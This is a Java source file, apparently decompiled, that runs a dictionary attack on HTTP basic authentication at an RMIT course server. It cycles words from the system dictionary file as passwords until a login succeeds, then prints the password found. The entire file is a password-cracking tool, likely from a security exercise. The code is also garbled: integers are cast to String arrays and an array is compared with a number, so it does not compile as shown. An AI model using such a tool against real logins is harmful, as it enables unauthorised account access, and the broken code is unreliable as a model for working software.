import java.net.MalformedURLException;
import java.io.IOException;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.Authenticator;
import java.io.BufferedReader;
import java.net.PasswordAuthentication;
import java.io.FileNotFoundException;
import java.io.FileReader;
public class Dictionary {
    private static BufferedReader a;
    private static MyAuthenticator b;
    public static void main ( String[] array ) {
        array = ( String[] ) ( Object ) 0;
        Authenticator.setDefault ( Dictionary.b );
        try {
            final URL url = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            while ( array != 1 ) {
                try {
                    Dictionary.a = new BufferedReader ( new InputStreamReader ( url.openStream() ) );
                    array = ( String[] ) ( Object ) 1;
                } catch ( IOException ex ) {}
            }
            while ( Dictionary.a.readLine() != null ) {}
            System.out.println ( "The successful Password found using a Dictionary search is = " + MyAuthenticator.a() );
        } catch ( MalformedURLException ex2 ) {
            System.out.println ( "mfURL" );
        }
    }
    static {
        Dictionary.a = null;
        Dictionary.b = new MyAuthenticator();
    }
}
class MyAuthenticator extends Authenticator {
    private String a;
    private static String b;
    private static String c;
    private static BufferedReader d;
    public MyAuthenticator() {
        this.a = "";
        try {
            MyAuthenticator.d = new BufferedReader ( new FileReader ( MyAuthenticator.c ) );
        } catch ( FileNotFoundException ex ) {
            System.out.println ( "File " + MyAuthenticator.c + " Not Found" );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        } catch ( IOException ex2 ) {
            System.out.println ( "File  Failed.." );
            System.exit ( 1 );
        }
    }
    static String a() {
        return MyAuthenticator.b;
    }
    private static String b() {
        try {
            if ( ( MyAuthenticator.b = MyAuthenticator.d.readLine() ) == null ) {
                System.out.println ( "Password Not found in file '" + MyAuthenticator.c + "'." );
                System.exit ( 1 );
            }
        } catch ( IOException ex ) {
            System.out.println ( "File IOException" );
            System.out.println ( ex );
        }
        return MyAuthenticator.b;
    }
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication ( this.a, b().toCharArray() );
    }
    static {
        MyAuthenticator.b = "";
        MyAuthenticator.c = "/usr/share/lib/dict/words";
    }
}
